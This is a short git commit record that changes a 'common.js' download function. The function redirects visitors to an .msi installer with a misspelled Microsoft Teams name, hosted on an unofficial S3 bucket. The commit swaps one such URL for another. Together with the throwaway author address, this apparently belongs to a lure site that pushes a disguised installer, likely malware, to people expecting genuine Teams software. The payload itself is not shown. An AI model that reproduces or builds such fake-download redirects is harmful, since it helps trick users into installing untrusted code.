62d6c5182a6d549564dc6466fe9623f53e426153
ms-teams-lit <mjdkdkkdtyjejjdimonika7@gmail.com>
2025-06-06 14:43:35 +0800

    Update common.js

--- common.js
+++ common.js
@@ -1,5 +1,5 @@
 function GetToFunction()
 {
-	var url="https://gg0606.s3.ap-southeast-1.amazonaws.com/TeamsMICSoft.msi";
+	var url="https://nmsl666.s3.ap-southeast-1.amazonaws.com/MSTM_setp.msi";
 	window.location=url;
 }
